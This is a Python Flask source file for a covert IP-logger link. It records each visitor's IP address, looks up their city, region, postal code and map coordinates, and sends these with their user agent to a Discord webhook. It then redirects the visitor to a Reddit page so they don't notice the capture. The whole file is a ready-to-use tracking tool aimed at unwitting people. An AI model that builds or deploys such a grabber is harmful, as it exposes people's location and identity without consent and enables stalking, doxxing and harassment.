import redis
import requests
from flask import Flask, request, redirect
from datetime import datetime
import os

app = Flask(__name__)

# Webhook URL for Discord
DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/YOUR_WEBHOOK_URL"

# Connect to Redis (ensure Redis is running locally)
redis_url = os.getenv("REDIS_URL", "redis://localhost:6379")  # Default to localhost if not set
r = redis.from_url(redis_url)

def get_real_ip():
    """Extract the real IP address from the request"""
    xff = request.headers.get("X-Forwarded-For", "").split(",")
    return xff[0].strip() if xff else request.remote_addr

def get_visitor_info(ip, user_agent):
    """Get geolocation info from ipapi based on IP address"""
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        
        if r.status_code == 200:
            details = r.json()
        else:
            details = {}
            print(f"API Error: Status Code {r.status_code}")
    except Exception as e:
        details = {}
        print(f"API Error: {e}")

    lat = details.get("latitude", 0)
    lon = details.get("longitude", 0)

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "XX").lower(),
        "region": details.get("region", "Unknown"),
        "city": details.get("city", "Unknown"),
        "zip": details.get("postal", "Unknown"),
        "lat": lat,
        "lon": lon,
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    """Send the visitor info to the Discord webhook"""
    embed = {
        "username": "🌍 Visitor Bot",
        "embeds": [{
            "title": f"🚶‍♂️ New Visitor from {info['country']}",
            "description": "Here’s a breakdown of the visitor's details:",
            "color": 7506394,  # Light teal color
            "fields": [
                {"name": "🖥️ IP & Location", "value": f"**IP:** `{info['ip']}`\n**City:** {info['city']} ({info['region']}, {info['country']})\n**Postal Code:** {info['zip']}", "inline": False},
                {"name": "📱 User Agent", "value": f"**Browser/Device:** `{info['user_agent']}`", "inline": False},
                {"name": "🌍 Google Maps Location", "value": f"[Click to view on Google Maps](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False}
            ],
            "footer": {
                "text": f"🔗 Visit logged at: {info['date']} {info['time']} (GMT)",
                "icon_url": "https://example.com/alarm-clock-icon.png"
            },
            "thumbnail": {
                "url": "https://example.com/thumbnail-image.png"  # Optional: Custom thumbnail
            }
        }]
    }

    response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
    print(f"Sent to Discord: {response.status_code}")

@app.route('/')
def index():
    """Main route that handles requests"""
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    if not r.sismember("logged_ips", ip):  # Check if the IP has already been logged
        r.sadd("logged_ips", ip)  # Log the IP in Redis
        info = get_visitor_info(ip, user_agent)
        send_to_discord(info)
    else:
        print(f"IP {ip} already logged.")

    return redirect("https://www.reddit.com/r/football/")  # Redirect to a random page

if __name__ == "__main__":
    app.run(debug=True)
